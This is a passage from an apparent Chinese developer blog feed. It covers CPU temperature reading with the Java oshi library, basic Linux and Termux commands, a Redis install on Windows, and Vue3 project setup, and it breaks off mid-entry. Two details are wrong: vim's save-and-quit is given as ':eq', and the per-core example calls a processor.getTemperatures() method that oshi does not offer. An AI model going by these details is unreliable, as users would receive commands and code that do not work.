        <content type="html"><![CDATA[<p>说是液金偏移检测软件，其实也只是通过监控不同的核心温度温差来做一个是否偏移的判断</p><p><strong>oshi</strong>是一个用于获取系统信息的Java库，可以用来获取关于硬件、操作系统和进程的详细信息。它提供了一组简单易用的API，使得获取系统信息变得非常方便。</p><p>oshi库的主要功能包括：</p><ol><li>获取硬件信息：包括CPU、内存、磁盘、网络接口等硬件相关信息。</li><li>获取操作系统信息：包括操作系统类型、版本、文件系统等信息。</li><li>获取进程信息：包括进程列表、资源利用率、线程数等信息。</li></ol><p>通过oshi库，你可以轻松地编写Java代码来获取系统的各种信息，从而实现一些系统管理、性能监控或诊断工具等应用程序。oshi库还在不断更新和改进中，以适应不同操作系统和硬件平台的需求。</p><p>总之，oshi库为Java开发者提供了一个强大且易用的工具，用于获取系统信息并进行相应处理。</p><p>首先，你需要在Maven或Gradle中添加oshi库的依赖项。</p><p>对于Maven项目，可以在 <code>pom.xml</code> 文件中添加以下依赖项：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.oshi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>oshi-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>对于Gradle项目，可以在 <code>build.gradle</code> 文件中添加以下依赖项：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">dependencies {</span><br><span class="line">    implementation <span class="string">'com.github.oshi:oshi-core:5.7.4'</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后，你可以使用以下代码示例来获取CPU温度信息：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> oshi.SystemInfo;</span><br><span class="line"><span class="keyword">import</span> oshi.hardware.CentralProcessor;</span><br><span class="line"><span class="keyword">import</span> oshi.hardware.Sensors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">SystemInfo</span> <span class="variable">systemInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SystemInfo</span>();</span><br><span class="line">        <span class="type">CentralProcessor</span> <span class="variable">processor</span> <span class="operator">=</span> systemInfo.getHardware().getProcessor();</span><br><span class="line">        <span class="type">Sensors</span> <span class="variable">sensors</span> <span class="operator">=</span> systemInfo.getHardware().getSensors();</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">cpuTemperature</span> <span class="operator">=</span> sensors.getCpuTemperature();</span><br><span class="line">        System.out.println(<span class="string">"CPU温度: "</span> + cpuTemperature + <span class="string">"°C"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这段代码将使用oshi库获取CPU温度信息，并将其打印到控制台上。记得处理可能的异常情况，比如未能获取到CPU温度的情况。</p><p>在上一个示例中，我展示了如何使用oshi来获取整个CPU的温度，如果你想获取每一个CPU核心的温度，你可以使用以下代码：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> oshi.SystemInfo;</span><br><span class="line"><span class="keyword">import</span> oshi.hardware.CentralProcessor;</span><br><span class="line"><span class="keyword">import</span> oshi.hardware.CentralProcessor.TickType;</span><br><span class="line"><span class="keyword">import</span> oshi.hardware.HardwareAbstractionLayer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">SystemInfo</span> <span class="variable">systemInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SystemInfo</span>();</span><br><span class="line">        <span class="type">HardwareAbstractionLayer</span> <span class="variable">hardware</span> <span class="operator">=</span> systemInfo.getHardware();</span><br><span class="line">        <span class="type">CentralProcessor</span> <span class="variable">processor</span> <span class="operator">=</span> hardware.getProcessor();</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span>[] temperatures = processor.getTemperatures();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; temperatures.length; i++) {</span><br><span class="line">            System.out.println(<span class="string">"Core "</span> + i + <span class="string">" 温度: "</span> + temperatures[i] + <span class="string">"°C"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这段代码中，我们使用 <code>processor.getTemperatures()</code> 方法获取到每个CPU核心的温度，并将其打印出来。这样你就能够查看每个CPU核心的温度了。</p><h3 id="返回结果是0"><a href="#返回结果是0" class="headerlink" title="返回结果是0"></a>返回结果是0</h3><p>很多PC机的硬件生产商一般都不会把CPU的温度、风扇转速、电压值向WMI开放，但是我们获取CPU的性能数据就是通过向WMI请求返回值的，这就造成请求下发但是不能返回值，返回的性能值都是 0 </p><p>解决办法：目前只能通过一个window插件获取到CPU的温度，其他参数还是不能获取到 </p><p>插件下载地址：<a href="https://openhardwaremonitor.org/">https://openhardwaremonitor.org/</a><br>————————————————<br>版权声明：本文为CSDN博主「请干了这碗鸡汤」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_23296327/article/details/104685687">https://blog.csdn.net/qq_23296327/article/details/104685687</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux常用命令</title>
      <link href="/NANABLOG/2023/12/22/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/NANABLOG/2023/12/22/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>ls</td><td>列出目录内容</td></tr><tr><td>cd</td><td>切换目录</td></tr><tr><td>pwd</td><td>显示当前工作目录</td></tr><tr><td>cp</td><td>复制文件或目录</td></tr><tr><td>mv</td><td>移动/重命名文件或目录</td></tr><tr><td>rm</td><td>删除文件或目录</td></tr><tr><td>mkdir</td><td>创建新目录</td></tr><tr><td>rmdir</td><td>删除空目录</td></tr><tr><td>touch</td><td>创建空文件</td></tr><tr><td>cat</td><td>查看或连接文件</td></tr><tr><td>grep</td><td>在文件中查找指定文本</td></tr><tr><td>chmod</td><td>修改文件或目录的权限</td></tr><tr><td>chown</td><td>修改文件或目录的所有者</td></tr><tr><td>ps</td><td>显示进程信息</td></tr><tr><td>top</td><td>显示系统中各个进程的资源占用情况</td></tr><tr><td>kill</td><td>终止进程</td></tr><tr><td>ifconfig</td><td>显示网络接口信息</td></tr><tr><td>ping</td><td>测试与另一台主机的连通性</td></tr><tr><td>ssh</td><td>远程登录到另一台计算机</td></tr><tr><td>scp</td><td>在两台计算机之间安全地传输文件</td></tr><tr><td>tar</td><td>打包/解包文件</td></tr><tr><td>find</td><td>查找文件</td></tr><tr><td>locate</td><td>快速定位文件位置</td></tr><tr><td>man</td><td>查看命令的帮助手册</td></tr></tbody></table><h1 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure><h1 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>  </span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ll </span><br></pre></td></tr></tbody></table></figure><h1 id="查看当前所在目录"><a href="#查看当前所在目录" class="headerlink" title="查看当前所在目录"></a>查看当前所在目录</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></tbody></table></figure><h1 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [文件夹名称]</span><br></pre></td></tr></tbody></table></figure><h1 id="移动文件或者修改文件名"><a href="#移动文件或者修改文件名" class="headerlink" title="移动文件或者修改文件名"></a>移动文件或者修改文件名</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> [旧名字] [新名字]</span><br></pre></td></tr></tbody></table></figure><h1 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> [文件夹名称]</span><br></pre></td></tr></tbody></table></figure><h1 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> [文件名] </span><br></pre></td></tr></tbody></table></figure><h1 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h1><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">vim </span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">vi  </span><br></pre></td></tr></tbody></table></figure><p>进入到文件中   </p><ul><li>通过按 <strong>i</strong> 或 <strong>a</strong> 进入到编辑模式</li><li>按 <strong>esc</strong> 退出编辑模式</li><li>输入 <strong>:eq</strong> 保存并退出  或者 <strong>:q!</strong> 强制退出</li></ul><p> </p><p>显示文件前几行:</p><p>head -n  </p><p>文件名</p><p>​       显示后几行: tail -n 文件名</p><p>​       切换用户: su</p><p>​       查看当前用户 whoami</p><p>​       查看进程 ps -ef </p><p>​   查看对应软件的进程 ps -ef | grep 软件名称</p><p>​       杀死进程 kill -9 pid</p><p>​       解压tar -zxvf  或者 tar -xvf</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis</title>
      <link href="/NANABLOG/2023/12/22/Redis/"/>
      <url>/NANABLOG/2023/12/22/Redis/</url>
      
        <content type="html"><![CDATA[<p>Redis是一个开源的使用ANSI C编写、支持网络、基于内存、可选持久性的键值对存储数据库。它通常被用作缓存、消息代理和排行榜等应用中。Redis支持多种类型的数据结构，如字符串、列表、集合、哈希表等，提供了丰富的功能和命令来操作这些数据结构。由于其高性能和灵活性，Redis被广泛应用于大型互联网应用系统中。</p><p><img src="/Blackcat-loveBlog/png/redis.jpg"></p><h1 id="Win本地安装"><a href="#Win本地安装" class="headerlink" title="Win本地安装"></a>Win本地安装</h1><p>解压win包</p><p>添加redis服务</p><p>到解压文件目录下 运行cmd</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">redis-server --service-install redis.windows.conf --loglevel verbose</span><br></pre></td></tr></tbody></table></figure><p>启动服务 redis</p><p>本地链接填入 本地ip 127.0.0.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termux终端学习笔记</title>
      <link href="/NANABLOG/2023/12/21/Termux%E7%BB%88%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/21/Termux%E7%BB%88%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>Termux 是一个 Android 下一个高级的终端模拟器，开源且不需要 root，支持 apt 管理软件包，十分方便安装软件包，完美支持 Python、 PHP、 Ruby、 Nodejs、 MySQL 等。随着智能设备的普及和性能的不断提升，如今的手机、平板等的硬件标准已达到了初级桌面计算机的硬件标准，用心去打造 DIY 的话完全可以把手机变成一个强大的极客工具。</p><p>官方学习文档:<a href="https://www.sqlsec.com/2018/05/termux.html">https://www.sqlsec.com/2018/05/termux.html</a></p><p>本笔记是个人学习记录，参考多个文档，感谢所有人的努力付出</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>可以通过F-droid获取到最新版本:<a href="https://f-droid.org/en/">https://f-droid.org/en/</a></p><p>Github开源:<a href="https://github.com/termux">https://github.com/termux</a></p><h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><h2 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pkg search &lt;query&gt;              <span class="comment"># 搜索包</span></span><br><span class="line">pkg install &lt;package&gt;           <span class="comment"># 安装包</span></span><br><span class="line">pkg uninstall &lt;package&gt;         <span class="comment"># 卸载包</span></span><br><span class="line">pkg reinstall &lt;package&gt;         <span class="comment"># 重新安装包</span></span><br><span class="line">pkg update                      <span class="comment"># 更新源</span></span><br><span class="line">pkg upgrade                     <span class="comment"># 升级软件包</span></span><br><span class="line">pkg list-all                    <span class="comment"># 列出可供安装的所有包</span></span><br><span class="line">pkg list-installed              <span class="comment"># 列出已经安装的包</span></span><br><span class="line">pkg show &lt;package&gt;              <span class="comment"># 显示某个包的详细信息</span></span><br><span class="line">pkg files &lt;package&gt;             <span class="comment"># 显示某个包的相关文件夹路径</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大事件管理系统项目</title>
      <link href="/NANABLOG/2023/12/20/%E5%A4%A7%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/NANABLOG/2023/12/20/%E5%A4%A7%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="后台数据管理系统-项目架构设计"><a href="#后台数据管理系统-项目架构设计" class="headerlink" title="后台数据管理系统 - 项目架构设计"></a>后台数据管理系统 - 项目架构设计</h1><p>在线演示：<a href="https://fe-bigevent-web.itheima.net/login">https://fe-bigevent-web.itheima.net/login</a></p><p>接口文档:   <a href="https://apifox.com/apidoc/shared-26c67aee-0233-4d23-aab7-08448fdf95ff/api-93850835">https://apifox.com/apidoc/shared-26c67aee-0233-4d23-aab7-08448fdf95ff/api-93850835</a></p><p><strong>接口根路径：</strong>  <a href="http://big-event-vue-api-t.itheima.net/">http://big-event-vue-api-t.itheima.net</a></p><p>本项目的技术栈 本项目技术栈基于 <a href="http://es6.ruanyifeng.com/">ES6</a>、<a href="https://cn.vuejs.org/index.html">vue3</a>、<a href="https://pinia.web3doc.top/">pinia</a>、<a href="https://router.vuejs.org/">vue-router</a> 、vite 、axios 和 <a href="https://element-plus.org/">element-plus</a></p><h2 id="pnpm-包管理器-创建项目"><a href="#pnpm-包管理器-创建项目" class="headerlink" title="pnpm 包管理器 - 创建项目"></a>pnpm 包管理器 - 创建项目</h2><p>一些优势：比同类工具快 2倍 左右、节省磁盘空间… <a href="https://www.pnpm.cn/">https://www.pnpm.cn/</a></p><p>安装方式：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">npm install -g pnpm</span><br></pre></td></tr></tbody></table></figure><p>创建项目：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pnpm create vue</span><br></pre></td></tr></tbody></table></figure><h2 id="ESLint-prettier-配置代码风格"><a href="#ESLint-prettier-配置代码风格" class="headerlink" title="ESLint &amp; prettier 配置代码风格"></a>ESLint &amp; prettier 配置代码风格</h2><p><strong>环境同步：</strong></p><ol><li><strong>安装了插件 ESlint，开启保存自动修复</strong></li><li><strong>禁用了插件 Prettier，并关闭保存自动格式化</strong></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// ESlint插件 + Vscode配置 实现自动格式化修复</span></span><br><span class="line"><span class="string">"editor.codeActionsOnSave"</span>: {</span><br><span class="line">    <span class="string">"source.fixAll"</span>: <span class="literal">true</span></span><br><span class="line">},</span><br><span class="line"><span class="string">"editor.formatOnSave"</span>: <span class="literal">false</span>,</span><br></pre></td></tr></tbody></table></figure><p><strong>配置文件 .eslintrc.cjs</strong></p><ol><li><p>prettier 风格配置 <a href="https://prettier.io/docs/en/options.html">https://prettier.io</a></p><ol><li><p>单引号</p></li><li><p>不使用分号</p></li><li><p>每行宽度至多80字符</p></li><li><p>不加对象|数组最后逗号</p></li><li><p>换行符号不限制（win mac 不一致）</p></li></ol></li><li><p>vue组件名称多单词组成（忽略index.vue）</p></li><li><p>props解构（关闭）</p></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">rules</span>: {</span><br><span class="line">  <span class="string">'prettier/prettier'</span>: [</span><br><span class="line">    <span class="string">'warn'</span>,</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">singleQuote</span>: <span class="literal">true</span>, <span class="comment">// 单引号</span></span><br><span class="line">      <span class="attr">semi</span>: <span class="literal">false</span>, <span class="comment">// 无分号</span></span><br><span class="line">      <span class="attr">printWidth</span>: <span class="number">80</span>, <span class="comment">// 每行宽度至多80字符</span></span><br><span class="line">      <span class="attr">trailingComma</span>: <span class="string">'none'</span>, <span class="comment">// 不加对象|数组最后逗号</span></span><br><span class="line">      <span class="attr">endOfLine</span>: <span class="string">'auto'</span> <span class="comment">// 换行符号不限制（win mac 不一致）</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">'vue/multi-word-component-names'</span>: [</span><br><span class="line">    <span class="string">'warn'</span>,</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">ignores</span>: [<span class="string">'index'</span>] <span class="comment">// vue组件名称多单词组成（忽略index.vue）</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">'vue/no-setup-props-destructure'</span>: [<span class="string">'off'</span>], <span class="comment">// 关闭 props 解构的校验</span></span><br><span class="line">  <span class="comment">// 💡 添加未定义变量错误提示，create-vue@3.6.3 关闭，这里加上是为了支持下一个章节演示。</span></span><br><span class="line">  <span class="string">'no-undef'</span>: <span class="string">'error'</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="基于-husky-的代码检查工作流"><a href="#基于-husky-的代码检查工作流" class="headerlink" title="基于 husky  的代码检查工作流"></a>基于 husky  的代码检查工作流</h2><p>husky 是一个 git hooks 工具  ( git的钩子工具，可以在特定时机执行特定的命令 )</p><p><strong>husky 配置</strong></p><ol><li><p>git初始化 git init</p></li><li><p>初始化 husky 工具配置  <a href="https://typicode.github.io/husky/">https://typicode.github.io/husky/</a></p></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm dlx husky-init &amp;&amp; pnpm install</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>修改 .husky/pre-commit 文件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm lint</span><br></pre></td></tr></tbody></table></figure><p><strong>问题：</strong>默认进行的是全量检查，耗时问题，历史问题。</p><p><strong>lint-staged 配置</strong></p><ol><li>安装</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm i lint-staged -D</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>配置 <code>package.json</code></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="comment">// ... 省略 ...</span></span><br><span class="line">  <span class="string">"lint-staged"</span>: {</span><br><span class="line">    <span class="string">"*.{js,ts,vue}"</span>: [</span><br><span class="line">      <span class="string">"eslint --fix"</span></span><br><span class="line">    ]</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">{</span><br><span class="line">  <span class="string">"scripts"</span>: {</span><br><span class="line">    <span class="comment">// ... 省略 ...</span></span><br><span class="line">    <span class="string">"lint-staged"</span>: <span class="string">"lint-staged"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>修改 .husky/pre-commit 文件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm lint-staged</span><br></pre></td></tr></tbody></table></figure><h2 id="调整项目目录"><a href="#调整项目目录" class="headerlink" title="调整项目目录"></a>调整项目目录</h2><p>默认生成的目录结构不满足我们的开发需求，所以这里需要做一些自定义改动。主要是两个工作：</p><ul><li>删除初始化的默认文件</li><li>修改剩余代码内容</li><li>新增调整我们需要的目录结构</li><li>拷贝初始化资源文件，安装预处理器插件</li></ul><ol><li><p>删除文件</p></li><li><p>修改内容</p></li></ol><p><code>src/router/index.js</code></p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { createRouter, createWebHistory } <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>({</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">env</span>.<span class="property">BASE_URL</span>),</span><br><span class="line">  <span class="attr">routes</span>: []</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></tbody></table></figure><p><code>src/App.vue</code></p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><p><code>src/main.js</code></p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { createApp } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> { createPinia } <span class="keyword">from</span> <span class="string">'pinia'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">createPinia</span>())</span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">'#app'</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li><p>新增需要目录 api  utils</p></li><li><p>将项目需要的全局样式 和 图片文件，复制到 assets 文件夹中,  并将全局样式在main.js中引入</p></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'@/assets/main.scss'</span></span><br></pre></td></tr></tbody></table></figure><ul><li>安装 sass 依赖</li></ul><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm add sass -D</span><br></pre></td></tr></tbody></table></figure><h2 id="VueRouter4-路由代码解析"><a href="#VueRouter4-路由代码解析" class="headerlink" title="VueRouter4 路由代码解析"></a>VueRouter4 路由代码解析</h2><p>基础代码解析</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { createRouter, createWebHistory } <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// createRouter 创建路由实例，===&gt; new VueRouter()</span></span><br><span class="line"><span class="comment">// 1. history模式: createWebHistory()   http://xxx/user</span></span><br><span class="line"><span class="comment">// 2. hash模式: createWebHashHistory()  http://xxx/#/user</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// vite 的配置 import.meta.env.BASE_URL 是路由的基准地址，默认是 ’/‘</span></span><br><span class="line"><span class="comment">// https://vitejs.dev/guide/build.html#public-base-path</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果将来你部署的域名路径是：http://xxx/my-path/user</span></span><br><span class="line"><span class="comment">// vite.config.ts  添加配置  base: my-path，路由这就会加上 my-path 前缀了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>({</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">env</span>.<span class="property">BASE_URL</span>),</span><br><span class="line">  <span class="attr">routes</span>: []</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></tbody></table></figure><p>import.meta.env.BASE_URL 是Vite 环境变量：<a href="https://cn.vitejs.dev/guide/env-and-mode.html">https://cn.vitejs.dev/guide/env-and-mode.html</a></p><h2 id="引入-element-ui-组件库"><a href="#引入-element-ui-组件库" class="headerlink" title="引入 element-ui 组件库"></a>引入 element-ui 组件库</h2><p><strong>官方文档：</strong> <a href="https://element-plus.org/zh-CN/">https://element-plus.org/zh-CN/</a></p><ul><li>安装</li></ul><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">$ pnpm add element-plus</span><br></pre></td></tr></tbody></table></figure><p><strong>自动按需：</strong></p><ol><li>安装插件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">pnpm add -D unplugin-vue-components unplugin-auto-<span class="keyword">import</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>然后把下列代码插入到你的 <code>Vite</code> 或 <code>Webpack</code> 的配置文件中</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AutoImport</span> <span class="keyword">from</span> <span class="string">'unplugin-auto-import/vite'</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Components</span> <span class="keyword">from</span> <span class="string">'unplugin-vue-components/vite'</span></span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">ElementPlusResolver</span> } <span class="keyword">from</span> <span class="string">'unplugin-vue-components/resolvers'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>({</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    ...</span><br><span class="line">    <span class="title class_">AutoImport</span>({</span><br><span class="line">      <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()]</span><br><span class="line">    }),</span><br><span class="line">    <span class="title class_">Components</span>({</span><br><span class="line">      <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()]</span><br><span class="line">    })</span><br><span class="line">  ]</span><br><span class="line">})</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>直接使用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>Primary<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"success"</span>&gt;</span>Success<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"info"</span>&gt;</span>Info<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"warning"</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"danger"</span>&gt;</span>Danger<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    ...</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong>彩蛋：</strong>默认 components 